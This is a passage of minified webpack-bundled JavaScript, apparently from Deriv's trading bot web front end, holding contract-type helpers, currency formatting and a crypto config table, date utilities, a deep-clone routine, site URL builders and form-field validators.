                    f = e => !!(e.status && "open" !== e.status || e.is_expired || e.is_settleable),
                    _ = e => "open" === u(e),
                    h = e => "sold" === e.status,
                    v = e => !!e.is_valid_to_cancel,
                    y = e => !f(e) && !h(e) && !!e.is_valid_to_sell,
                    k = e => !!e.entry_spot,
                    g = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                        return /ACCU/i.test(e)
                    },
                    T = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                        return /MULT/i.test(e)
                    },
                    E = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                        return /TURBOS/i.test(e)
                    },
                    A = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                        return /VANILLA/i.test(e)
                    },
                    x = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                        return /RUN|EXPIRY|RANGE|UPORDOWN|ASIAN|RESET|TICK|LB/i.test(e)
                    },
                    w = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                        return /ASIAN/i.test(e)
                    },
                    N = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                        return /LB/i.test(e)
                    },
                    S = e => {
                        let t = (0, s.Tw)(e.tick_stream || [], "epoch"),
                            n = C(e.contract_type) || w(e.contract_type) ? t.length : t.length - 1;
                        return !n || n < 0 ? 0 : n
                    },
                    C = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                        return /digit/i.test(e)
                    },
                    O = e => Number(e.bid_price) - Number(e.buy_price),
                    L = e => {
                        if (!e) return {
                            stop_loss: null,
                            take_profit: null
                        };
                        let {
                            stop_loss: {
                                order_amount: t
                            } = {},
                            take_profit: {
                                order_amount: n
                            } = {}
                        } = e;
                        return {
                            stop_loss: t,
                            take_profit: n
                        }
                    },
                    R = (e, t, n) => {
                        let a = l().duration(l().unix(n).diff(l().unix(t))),
                            i = l().duration(l().unix(n).diff(e)).asMilliseconds() / a.asMilliseconds() * 100;
                        return i < .5 ? i = 0 : i > 100 && (i = 100), Math.round(i)
                    },
                    I = e => 100 * e,
                    D = e => {
                        let t = "purchased";
                        return f(e) && (t = O(e) >= 0 ? "won" : "lost"), t
                    },
                    U = e => {
                        let {
                            contract_update: t,
                            limit_order: n
                        } = e, {
                            stop_loss: a,
                            take_profit: i
                        } = L(n || t);
                        return {
                            contract_update_stop_loss: a ? Math.abs(a).toString() : "",
                            contract_update_take_profit: i ? i.toString() : "",
                            has_contract_update_stop_loss: !!a,
                            has_contract_update_take_profit: !!i
                        }
                    },
                    P = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                        return /(VANILLALONG|TURBOS)/i.test(e) ? (0, d.fm)(e.replace(/(VANILLALONG|TURBOS)/i, "").toLowerCase()) : ""
                    },
                    V = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                        return E(e) ? "Long" === P(e) ? (0, a.jsx)(o.Xx, {
                            i18n_default_text: "Up"
                        }) : (0, a.jsx)(o.Xx, {
                            i18n_default_text: "Down"
                        }) : ""
                    },
                    M = (e, t) => {
                        t ? (t.preventDefault(), ("keydown" !== t.type || "keydown" === t.type && "Enter" === t.key) && (null == e || e())) : null == e || e()
                    },
                    B = (e, t, n) => "buy" === e && !!(0, r.s0)(t, n);
                n("42231")
            },
            52717: function(e, t, n) {
                "use strict";
                n.d(t, {
                    i4: () => u,
                    dr: () => o,
                    bf: () => l,
                    oS: () => m,
                    oC: () => d,
                    lb: () => s,
                    O$: () => p
                });
                var a = n("11016");
                let i = {},
                    l = (e, t) => Number(Number(e).toFixed(u(t))),
                    o = (e, t) => `${d(e,u(t),m(t))} ${t}`,
                    s = function(e, t, n) {
                        let a = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : 0,
                            i = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : 0,
                            l = t;
                        l && (l = String(l).replace(/,/g, ""));
                        let o = l && 0 > Number(l) ? "-" : "",
                            s = a || u(e);
                        return l = isNaN(+l) ? 0 : Math.abs(+l), "undefined" != typeof Intl ? l = new Intl.NumberFormat("en", {
                            minimumFractionDigits: i || s,
                            maximumFractionDigits: s
                        }).format(l) : l = d(l, s), o + (n ? "" : r(e)) + l
                    },
                    r = e => `<span class="symbols ${(e||"").toLowerCase()}"></span>`,
                    d = (e, t, n) => {
                        let a = String(e || 0).replace(/,/g, "");
                        return void 0 !== t && (a = (+a).toFixed(t)), n && (a = parseFloat(String(a))), a.toString().replace(/(^|[^\w.])(\d{4,})/g, (e, t, n) => t + n.replace(/\d(?=(?:\d\d\d)+(?!\d))/g, "$&,"))
                    },
                    c = e => m(e) ? (0, a.SX)(b.get(), [e, "fractional_digits"]) : 2,
                    u = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                        return i[e] ? (0, a.SX)(i, [e, "fractional_digits"]) : c(e)
                    },
                    m = e => /crypto/i.test((0, a.SX)(i, [e, "type"])) || e in b.get(),
                    b = (() => {
                        let e;
                        let t = () => (0, a._A)({
                            BTC: {
                                display_code: "BTC",
                                name: "Bitcoin",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 8
                            },
                            BUSD: {
                                display_code: "BUSD",
                                name: "Binance USD",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 2
                            },
                            DAI: {
                                display_code: "DAI",
                                name: "Multi-Collateral DAI",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 2
                            },
                            EURS: {
                                display_code: "EURS",
                                name: "STATIS Euro",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 2
                            },
                            IDK: {
                                display_code: "IDK",
                                name: "IDK",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 0
                            },
                            PAX: {
                                display_code: "PAX",
                                name: "Paxos Standard",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 2
                            },
                            TUSD: {
                                display_code: "TUSD",
                                name: "True USD",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 2
                            },
                            USDC: {
                                display_code: "USDC",
                                name: "USD Coin",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 2
                            },
                            USDK: {
                                display_code: "USDK",
                                name: "USDK",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 2
                            },
                            eUSDT: {
                                display_code: "eUSDT",
                                name: "Tether ERC20",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 2
                            },
                            tUSDT: {
                                display_code: "tUSDT",
                                name: "Tether TRC20",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 2
                            },
                            BCH: {
                                display_code: "BCH",
                                name: "Bitcoin Cash",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 8
                            },
                            ETH: {
                                display_code: "ETH",
                                name: "Ether",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 8
                            },
                            ETC: {
                                display_code: "ETC",
                                name: "Ether Classic",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 8
                            },
                            LTC: {
                                display_code: "LTC",
                                name: "Litecoin",
                                min_withdrawal: .002,
                                pa_max_withdrawal: 5,
                                pa_min_withdrawal: .002,
                                fractional_digits: 8
                            },
                            UST: {
                                display_code: "USDT",
                                name: "Tether Omni",
                                min_withdrawal: .02,
                                pa_max_withdrawal: 2e3,
                                pa_min_withdrawal: 10,
                                fractional_digits: 2
                            }
                        });
                        return {
                            get: () => (!e && (e = t()), e)
                        }
                    })(),
                    p = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "";
                        return "eUSDT" !== e && "tUSDT" !== e && (e = e.toUpperCase()), (0, a.SX)(b.get(), [e, "display_code"]) || e
                    }
            },
            72755: function(e, t, n) {
                "use strict";
                n.d(t, {
                    LU: function() {
                        return c
                    },
                    QR: function() {
                        return d
                    },
                    fc: function() {
                        return u
                    },
                    gb: function() {
                        return o
                    },
                    mr: function() {
                        return r
                    },
                    p6: function() {
                        return s
                    },
                    vk: function() {
                        return l
                    }
                });
                var a = n(30381),
                    i = n.n(a);
                n(48059), i().createFromInputFallback = function(e) {
                    e._d = new Date(NaN)
                };
                let l = e => i().unix(e).utc(),
                    o = e => {
                        if (!e) return i()().utc();
                        if (e instanceof i() && e.isValid() && e.isUTC()) return e;
                        if ("number" == typeof e) return l(e);
                        if (/invalid/i.test(i()(e).toString())) {
                            let t = i()(),
                                n = t.utc().daysInMonth();
                            return i().utc(e, "DD MMM YYYY").valueOf() / 864e5 > n ? i().utc(t.add(e, "d"), "DD MMM YYYY") : i().utc(e, "DD MMM YYYY")
                        }
                        return i().utc(e)
                    },
                    s = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "YYYY-MM-DD",
                            n = !(arguments.length > 2) || void 0 === arguments[2] || arguments[2];
                        return n || null !== e ? o(e).format(t) : void 0
                    },
                    r = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "HH:mm:ss [GMT]";
                        return o(e).format(t)
                    },
                    d = (e, t) => i().duration(i().unix(t).diff(i().unix(e))),
                    c = (e, t) => {
                        let n = Math.floor(e.asDays()),
                            a = e.hours(),
                            l = e.minutes(),
                            o = e.seconds();
                        return {
                            days: n,
                            timestamp: i()(0).hour(a).minute(l).seconds(o).format(t || "HH:mm:ss")
                        }
                    },
                    u = (e, t, n) => i()(e, t).format(n)
            },
            78485: function(e, t, n) {
                "use strict";
                e = n.hmd(e);
                let a = function() {
                    let e, t, n;

                    function a(e, t) {
                        return null != t && e instanceof t
                    }
                    try {
                        e = Map
                    } catch (t) {
                        e = function() {}
                    }
                    try {
                        t = Set
                    } catch (e) {
                        t = function() {}
                    }
                    try {
                        n = Promise
                    } catch (e) {
                        n = function() {}
                    }

                    function i(l, s, r, d, c) {
                        "object" == typeof s && (r = s.depth, d = s.prototype, c = s.includeNonEnumerable, s = s.circular);
                        let u = [],
                            m = [],
                            b = "undefined" != typeof Buffer;
                        return void 0 === s && (s = !0), void 0 === r && (r = 1 / 0),
                            function l(r, p) {
                                let f, _;
                                if (null === r) return null;
                                if (0 === p || "object" != typeof r) return r;
                                if (a(r, e)) f = new e;
                                else if (a(r, t)) f = new t;
                                else if (a(r, n)) f = new n(function(e, t) {
                                    r.then(function(t) {
                                        e(l(t, p - 1))
                                    }, function(e) {
                                        t(l(e, p - 1))
                                    })
                                });
                                else if (i.__isArray(r)) f = [];
                                else if (i.__isRegExp(r)) f = new RegExp(r.source, o(r)), r.lastIndex && (f.lastIndex = r.lastIndex);
                                else if (i.__isDate(r)) f = new Date(r.getTime());
                                else {
                                    if (b && Buffer.isBuffer(r)) return Buffer.from ? f = Buffer.from(r) : (f = new Buffer(r.length), r.copy(f)), f;
                                    a(r, Error) ? f = Object.create(r) : void 0 === d ? f = Object.create(_ = Object.getPrototypeOf(r)) : (f = Object.create(d), _ = d)
                                }
                                if (s) {
                                    let e = u.indexOf(r);
                                    if (-1 != e) return m[e];
                                    u.push(r), m.push(f)
                                }
                                for (var h in a(r, e) && r.forEach(function(e, t) {
                                        let n = l(t, p - 1),
                                            a = l(e, p - 1);
                                        f.set(n, a)
                                    }), a(r, t) && r.forEach(function(e) {
                                        let t = l(e, p - 1);
                                        f.add(t)
                                    }), r) {
                                    if (Object.getOwnPropertyDescriptor(r, h)) {
                                        if (0 > Object.keys(r).indexOf(h)) continue;
                                        f[h] = l(r[h], p - 1)
                                    }
                                    try {
                                        let e = Object.getOwnPropertyDescriptor(r, h);
                                        if ("undefined" === e.set) continue;
                                        f[h] = l(r[h], p - 1)
                                    } catch (e) {
                                        if (e instanceof TypeError) continue;
                                        if (e instanceof ReferenceError) continue
                                    }
                                }
                                if (Object.getOwnPropertySymbols) {
                                    let e = Object.getOwnPropertySymbols(r);
                                    for (var h = 0; h < e.length; h++) {
                                        let t = e[h];
                                        var v = Object.getOwnPropertyDescriptor(r, t);
                                        if (!v || !!v.enumerable || !!c) f[t] = l(r[t], p - 1), Object.defineProperty(f, t, v)
                                    }
                                }
                                if (c) {
                                    let e = Object.getOwnPropertyNames(r);
                                    for (var h = 0; h < e.length; h++) {
                                        let t = e[h];
                                        var v = Object.getOwnPropertyDescriptor(r, t);
                                        if (!v || !v.enumerable) f[t] = l(r[t], p - 1), Object.defineProperty(f, t, v)
                                    }
                                }
                                return f
                            }(l, r)
                    }

                    function l(e) {
                        return Object.prototype.toString.call(e)
                    }
                    i.clonePrototype = function(e) {
                        if (null === e) return null;
                        let t = function() {};
                        return t.prototype = e, new t
                    }, i.__objToStr = l;
                    i.__isDate = function(e) {
                        return "object" == typeof e && "[object Date]" === l(e)
                    };
                    i.__isArray = function(e) {
                        return "object" == typeof e && "[object Array]" === l(e)
                    };

                    function o(e) {
                        let t = "";
                        return e.global && (t += "g"), e.ignoreCase && (t += "i"), e.multiline && (t += "m"), t
                    }
                    return i.__isRegExp = function(e) {
                        return "object" == typeof e && "[object RegExp]" === l(e)
                    }, i.__getRegExpFlags = o, i
                }();
                e.exports && (e.exports = a)
            },
            11016: function(e, t, n) {
                "use strict";
                n.d(t, {
                    LI: function() {
                        return a.LI
                    },
                    Qr: function() {
                        return a.Qr
                    },
                    SX: function() {
                        return a.SX
                    },
                    Tw: function() {
                        return a.Tw
                    },
                    _A: function() {
                        return a._A
                    },
                    ei: function() {
                        return a.ei
                    },
                    kI: function() {
                        return a.kI
                    },
                    uv: function() {
                        return a.uv
                    },
                    vP: function() {
                        return a.vP
                    },
                    xb: function() {
                        return a.xb
                    }
                }), n(78485);
                var a = n(45543)
            },
            45543: function(e, t, n) {
                "use strict";
                n.d(t, {
                    LI: function() {
                        return m
                    },
                    Qr: function() {
                        return a
                    },
                    SX: function() {
                        return d
                    },
                    Tw: function() {
                        return r
                    },
                    _A: function() {
                        return b
                    },
                    ei: function() {
                        return u
                    },
                    kI: function() {
                        return i
                    },
                    uv: function() {
                        return s
                    },
                    vP: function() {
                        return c
                    },
                    xb: function() {
                        return l
                    }
                });
                let a = e => {
                        let t = !0;
                        return e && e instanceof Object && Object.keys(e).forEach(n => {
                            Object.prototype.hasOwnProperty.call(e, n) && (t = !1)
                        }), t
                    },
                    i = e => {
                        if (a(e)) return e;
                        let t = Array.isArray(e) ? [] : {};
                        for (let n in e) Object.prototype.hasOwnProperty.call(e, n) && (t[n] = e[n]);
                        return t
                    },
                    l = (e, t) => {
                        if (typeof e != typeof t) return !1;
                        if (Array.isArray(e)) return o(e, t);
                        if (e && t && "object" == typeof e) return s(e, t);
                        else if ("number" == typeof e && "number" == typeof t && isNaN(e) && isNaN(t)) return !0;
                        return e === t
                    },
                    o = (e, t) => e === t || e.length === t.length && e.every((e, n) => l(e, t[n])),
                    s = (e, t) => e === t || Object.keys(e).length === Object.keys(t).length && Object.keys(e).every(n => l(e[n], t[n])),
                    r = (e, t) => e.filter((n, a) => e.findIndex((e, i) => e[t] ? e[t] === n[t] : i === a) === a),
                    d = (e, t) => {
                        let n = t;
                        return (!Array.isArray(n) && (n = [n]), !a(e) && n[0] in e && n && n.length > 1) ? d(e[n[0]], n.slice(1)) : e ? i(e[n[0]]) : void 0
                    },
                    c = e => Array.from(Array(e).keys()),
                    u = (e, t) => t.reduce((t, n) => (Object.prototype.hasOwnProperty.call(e, n) && (t[n] = e[n]), t), {}),
                    m = (e, t) => {
                        let n;
                        return Object.keys(e).some(a => {
                            let i = e[a];
                            if (a === t) return n = e[t], !0;
                            if ("object" == typeof i) {
                                let e = m(i, t);
                                if (e) return n = e, !0
                            }
                            return !1
                        }), n
                    },
                    b = e => (Object.getOwnPropertyNames(e).forEach(t => {
                        let n = e[t];
                        n && "object" == typeof n && !Object.isFrozen(n) && b(n)
                    }), Object.freeze(e))
            },
            42231: function(e, t, n) {
                "use strict";
                n.d(t, {
                    x: () => l
                });
                let a = {
                        derivCom: {
                            staging: "https://staging.deriv.com",
                            production: {
                                me: "https://deriv.me",
                                be: "https://deriv.be",
                                com: "https://deriv.com"
                            }
                        },
                        derivApp: {
                            staging: "https://staging-app.deriv.com",
                            production: {
                                me: "https://app.deriv.me",
                                be: "https://app.deriv.be",
                                com: "https://app.deriv.com"
                            }
                        },
                        smartTrader: {
                            staging: {
                                me: "https://staging-smarttrader.deriv.me",
                                be: "https://staging-smarttrader.deriv.be",
                                com: "https://staging-smarttrader.deriv.com"
                            },
                            production: {
                                me: "https://smarttrader.deriv.me",
                                be: "https://smarttrader.deriv.be",
                                com: "https://smarttrader.deriv.com"
                            }
                        }
                    },
                    i = e => {
                        let t = window.location.hostname,
                            n = t.includes("staging"),
                            i = t.endsWith(".me") ? "me" : t.endsWith(".be") ? "be" : "com",
                            l = a[e];
                        return n ? "string" == typeof l.staging ? l.staging : l.staging[i] : l.production[i]
                    },
                    l = {
                        bot: `${window.location.origin}`,
                        cashier: `${i("derivApp")}/cashier/`,
                        cashier_deposit: `${i("derivApp")}/cashier/deposit`,
                        cashier_p2p: `${i("derivApp")}/cashier/p2p`,
                        contract: `${i("derivApp")}/contract/:contract_id`,
                        personal_details: `${i("derivApp")}/account/personal-details`,
                        positions: `${i("derivApp")}/reports/positions`,
                        profit: `${i("derivApp")}/reports/profit`,
                        reports: `${i("derivApp")}/reports`,
                        root: i("derivApp"),
                        smarttrader: i("smartTrader"),
                        statement: `${i("derivApp")}/reports/statement`,
                        trade: `${i("derivApp")}/dtrader`,
                        traders_hub: i("derivApp"),
                        wallets_transfer: `${i("derivApp")}/wallet/account-transfer`,
                        signup: "https://track.deriv.com/_2yZaBZhr48dMjdsyM5hasGNd7ZgqdRLk/1/",
                        deriv_app: i("derivApp"),
                        endpoint: `${window.location.origin}/endpoint`,
                        account_limits: `${i("derivApp")}/account/account-limits`,
                        help_center: `${i("derivCom")}/help-centre/`,
                        responsible: `${i("derivCom")}/responsible/`
                    }
            },
            77149: function(e, t, n) {
                "use strict";
                n.d(t, {
                    b1: function() {
                        return a
                    },
                    nI: function() {
                        return l
                    },
                    tq: function() {
                        return i
                    }
                });
                let a = () => "ontouchstart" in window || "ontouchstart" in document.documentElement || window.DocumentTouch && document instanceof window.DocumentTouch || navigator.maxTouchPoints > 0 || window.navigator.msMaxTouchPoints > 0,
                    i = () => window.innerWidth <= 600,
                    l = () => o() || window.innerWidth > 1279,
                    o = () => 600 < window.innerWidth && window.innerWidth <= 1279
            },
            29398: function(e, t, n) {
                "use strict";
                n.d(t, {
                    s0: () => c,
                    CY: () => r
                });
                let a = "^([A-Z]+)_((?:1HZ[0-9-V]+)|(?:(?:CRASH|BOOM)[0-9\\d]+[A-Z]?)|(?:cry_[A-Z]+)|(?:JD[0-9]+)|(?:OTC_[A-Z0-9]+)|R_[\\d]{2,3}|[A-Z]+)_([\\d.]+)",
                    i = RegExp(`${a}_(\\d+)_(\\d*\\.?\\d*)_(\\d+)_(\\d*\\.?\\d*)_(\\d+)`),
                    l = RegExp(`${a}_(\\d+)_(\\d+)`),
                    o = RegExp(`${a}_([A-Z\\d]+)_([A-Z\\d]+)_?([A-Z\\d]+)?`),
                    s = e => {
                        let t;
                        let n = {
                                category: "",
                                underlying: "",
                                barrier_1: "",
                                multiplier: "",
                                start_time: "",
                                payout_tick: "",
                                growth_rate: "",
                                growth_frequency: ""
                            },
                            a = /^ACCU/i.test(e),
                            s = /^MULT/i.test(e),
                            r = (t = s ? l : a ? i : o).exec(e);
                        return null !== r && (n.category = r[1].charAt(0).toUpperCase() + r[1].slice(1).toLowerCase(), n.underlying = r[2], s ? (n.multiplier = r[4], n.start_time = r[5]) : a ? (n.payout_tick = r[4], n.growth_rate = r[5], n.growth_frequency = r[6], n.start_time = r[8]) : n.start_time = r[4], /^(CALL|PUT)$/i.test(n.category) && (n.barrier_1 = r[6])), n
                    },
                    r = e => {
                        let {
                            shortcode: t = "",
                            shortcode_info: n
                        } = e, a = t ? s(t) : n;
                        return !!a && !!a.barrier_1 && !/^S0P$/.test(a.barrier_1)
                    },
                    d = e => {
                        let t = s(e);
                        return (null == t ? !void 0 : !t.multiplier) && ((null == t ? void 0 : t.start_time) || "")
                    },
                    c = (e, t) => {
                        let n = d(e);
                        return n && t && /f$/gi.test(n)
                    }
            },
            46677: function(e, t, n) {
                "use strict";
                n.d(t, {
                    _v: function() {
                        return r
                    },
                    fm: function() {
                        return s
                    },
                    pp: function() {
                        return l
                    },
                    qB: function() {
                        return i
                    }
                });
                let a = (e, t, n) => {
                        let a = String(e || "");
                        return a.length >= t ? a : `${Array(t-a.length+1).join(n)}${a}`
                    },
                    i = (e, t) => {
                        let n = o(e),
                            i = o(t);
                        if (!n || !i) return "";
                        let l = Math.max(n.length, i.length);
                        n = a(n, l, "0"), i = a(i, l, "0");
                        let s = 0;
                        return n !== i && (s = n > i ? 1 : -1), s
                    },
                    l = (e, t) => !!((null == t ? void 0 : t.length) < 1) || RegExp(t.split("").reduce((e, t) => `${e}[^${t}]*${t}`, ""), "i").test(e),
                    o = e => "number" == typeof e ? String(e) : e,
                    s = e => e && e[0].toUpperCase() + e.slice(1),
                    r = e => e.normalize("NFD").split("").filter(e => /^[a-z ]*$/i.test(e)).join("")
            },
            24797: function(e, t, n) {
                "use strict";
                n.d(t, {
                    L: function() {
                        return s
                    }
                });
                let a = "deriv.com",
                    i = [a, "deriv.me", "deriv.be"],
                    l = "undefined" != typeof window && window.location.hostname.split("app.")[1] || "",
                    o = i.includes(l) ? l : a,
                    s = Object.freeze({
                        DERIV_HOST_NAME: o,
                        DERIV_COM_PRODUCTION: `https://${o}`,
                        DERIV_COM_PRODUCTION_EU: `https://eu.${o}`,
                        DERIV_COM_STAGING: `https://staging.${o}`,
                        DERIV_APP_PRODUCTION: `https://app.${o}`,
                        DERIV_APP_STAGING: `https://staging-app.${o}`,
                        SMARTTRADER_PRODUCTION: `https://smarttrader.${o}`,
                        SMARTTRADER_STAGING: `https://staging-smarttrader.${o}`,
                        BINARYBOT_PRODUCTION: `https://bot.${o}`,
                        BINARYBOT_STAGING: `https://staging-bot.${o}`
                    })
            },
            339: function(e, t, n) {
                "use strict";
                let a;
                n.d(t, {
                    y_: () => d,
                    RK: () => m,
                    MT: () => c,
                    SM: () => u
                });
                var i = n("24797"),
                    l = n("18470");
                n("42231");
                let o = "binary.com",
                    s = {
                        "bot.binary.com": "www.binary.bot",
                        "developers.binary.com": "developers.binary.com",
                        "academy.binary.com": "academy.binary.com",
                        "blog.binary.com": "blog.binary.com"
                    },
                    r = e => e ? e.replace(/(^\/|\/$|[^a-zA-Z0-9-_./()#])/g, "") : "",
                    d = e => {
                        let t = (0, l.zY)();
                        if (!t) return e;
                        let n = new URL(e);
                        if (Object.keys(s).includes(n.hostname)) n.hostname = s[n.hostname];
                        else {
                            if (!n.hostname.match(o)) return e;
                            n.hostname = n.hostname.replace(RegExp(`\\.${o}`, "i"), `.${t}`)
                        }
                        return n.href
                    },
                    c = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "",
                            t = window.location;
                        return /^\/(br_)/.test(t.pathname) ? `/${t.pathname.split("/")[1]}${/^\//.test(e)?e:`/${e}`}` : e
                    },
                    u = e => {
                        a = e
                    },
                    m = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "",
                            t = arguments.length > 1 && void 0 !== arguments[1] && arguments[1],
                            n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2],
                            l = n ? i.L.DERIV_COM_PRODUCTION_EU : i.L.DERIV_COM_PRODUCTION,
                            o = null == a ? void 0 : a.toLowerCase();
                        return (o = o && "en" !== o ? `/${o}` : "", t) ? `${l}/${r(e)}` : (l === i.L.DERIV_COM_PRODUCTION && o.includes("_") && (o = o.replace("_", "-")), `${l}${o}/${r(e)}`)
                    }
            },
            40968: function(e, t, n) {
                "use strict";
                let a, i;
                n.d(t, {
                    Cc: function() {
                        return S
                    },
                    JL: function() {
                        return d
                    },
                    bf: function() {
                        return N
                    }
                });
                var l = n(52717),
                    o = n(11016),
                    s = n(46677);
                let r = e => null != e && e.toString().replace(/\s/g, "").length > 0,
                    d = ". , ' : ; ( ) \xb0 @ # / -",
                    c = (e, t) => {
                        if ((null == t ? void 0 : t.is_required) && (!e || e.match(/^\s*$/))) return {
                            is_ok: !1,
                            message: null == i ? void 0 : i.empty_address()
                        };
                        if (!f(e, {
                                min: 0,
                                max: 70
                            })) return {
                            is_ok: !1,
                            message: null == i ? void 0 : i.maxNumber(70)
                        };
                        if (!/^[\p{L}\p{Nd}\s'.,:;()\u00b0@#/-]{0,70}$/u.test(e)) return {
                            is_ok: !1,
                            message: null == i ? void 0 : i.address()
                        };
                        return {
                            is_ok: !0
                        }
                    },
                    u = e => "" === e || /^[A-Za-z0-9][A-Za-z0-9\s-]*$/.test(e),
                    m = e => /(?!^$|\s+)[A-Za-z0-9./\s-]$/.test(e),
                    b = e => /^\+?([0-9-]+\s)*[0-9-]+$/.test(e),
                    p = e => /^(?!.*\s{2,})[\p{L}\s'.-]{2,50}$/u.test(e),
                    f = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "",
                            t = arguments.length > 1 ? arguments[1] : void 0;
                        return (!t.min || e.length >= Number(t.min)) && (!t.max || e.length <= Number(t.max))
                    },
                    _ = e => /^(?=.*[a-z])(?=.*\d)(?=.*[A-Z])[!-~]{8,25}$/.test(e),
                    h = e => /^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,63}$/.test(e),
                    v = e => /^[+-]?\d+\.?\d*$/.test(e),
                    y = e => !/[`~!@#$%^&*)(_=+[}{\]\\/";:?><|]+/.test(e),
                    k = (e, t) => {
                        var n;
                        return null === (n = t.regex) || void 0 === n ? void 0 : n.test(e)
                    },
                    g = e => !!e,
                    T = e => !/p[.\s]+o[.\s]+box/i.test(e),
                    E = e => 8 === e.trim().length,
                    A = (e, t) => "float" === t.type ? +e > Number(t.max) : 1 === (0, s.qB)(e, t.max),
                    x = (e, t) => {
                        let n = (0, o.kI)(t),
                            a = null;
                        if (n.allow_empty && 0 === e.length) return {
                            is_ok: !0
                        };
                        let s = !0;
                        if ("min" in n && "function" == typeof n.min && (n.min = n.min()), "max" in n && "function" == typeof n.max && (n.max = n.max()), !("float" === n.type ? /^\d*(\.\d+)?$/ : /^\d+$/).test(e) || isNaN(+e)) s = !1, a = i.number();
                        else if ("min" in n && "max" in n && +n.min == +n.max && +e != +n.min) s = !1, a = i.value((0, l.oC)(n.min, n.decimals));
                        else if ("min" in n && "max" in n && n.min > 0 && (+e < +n.min || A(+e, n))) {
                            s = !1;
                            let e = (0, l.oC)(n.min, n.decimals),
                                t = (0, l.oC)(n.max, n.decimals);
                            a = i.betweenMinMax(e, t)
                        } else if ("float" === n.type && n.decimals && !RegExp(`^\\d+(\\.\\d{0,${n.decimals}})?$`).test(e)) s = !1, a = i.decimalPlaces(n.decimals);
                        else if ("min" in n && +e < +n.min) {
                            s = !1;
                            let e = (0, l.oC)(n.min, n.decimals);
                            a = i.minNumber(e)
                        } else if ("max" in n && A(+e, n)) {
                            s = !1;
                            let e = (0, l.oC)(n.max, n.decimals);
                            a = i.maxNumber(e)
                        }
                        return {
                            is_ok: s,
                            message: a
                        }
                    },
                    w = () => ({
                        address: {
                            func: c,
                            message: i.address
                        },
                        barrier: {
                            func: v,
                            message: i.barrier
                        },
                        email: {
                            func: h,
                            message: i.email
                        },
                        general: {
                            func: y,
                            message: i.general
                        },
                        length: {
                            func: f,
                            message: ""
                        },
                        name: {
                            func: p,
                            message: i.name
                        },
                        number: {
                            func: function() {
                                for (var e = arguments.length, t = Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                                let [a, i] = t;
                                return x(a, i)
                            },
                            message: i.number
                        },
                        password: {
                            func: _,
                            message: i.password
                        },
                        phone: {
                            func: b,
                            message: i.phone
                        },
                        po_box: {
                            func: T,
                            message: i.po_box
                        },
                        postcode: {
                            func: u,
                            message: i.postcode
                        },
                        regular: {
                            func: k,
                            message: ""
                        },
                        req: {
                            func: r,
                            message: ""
                        },
                        confirm: {
                            func: g,
                            message: ""
                        },
                        signup_token: {
                            func: E,
                            message: i.signup_token
                        },
                        tax_id: {
                            func: m,
                            message: i.validTaxID
                        }
                    }),
                    N = e => {
                        !a && (i = e, a = w())
                    },
                    S = () => a
            },
            419: function(e, t, n) {
                "use strict";
                n.d(t, {
                    JL: () => a.JL
                });
                var a = n("40968");
                n("32750"), n("63069")
            },
            8015: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: () => u
                });
                var a = n("85893");
                n("67294");
                var i = n("63387"),
                    l = n.n(i),
                    o = n("89606"),
                    s = n("45452"),
                    r = n("31302");
                n("12199");
                let d = e => (0, a.jsx)(r.Z, { ...e,
                        is_fullscreen: !1,
                        className: "initial-loader--btn"
                    }),
                    c = e => {
                        let {
                            black: t,
                            blue: n,
                            children: i,
                            className: r = "",
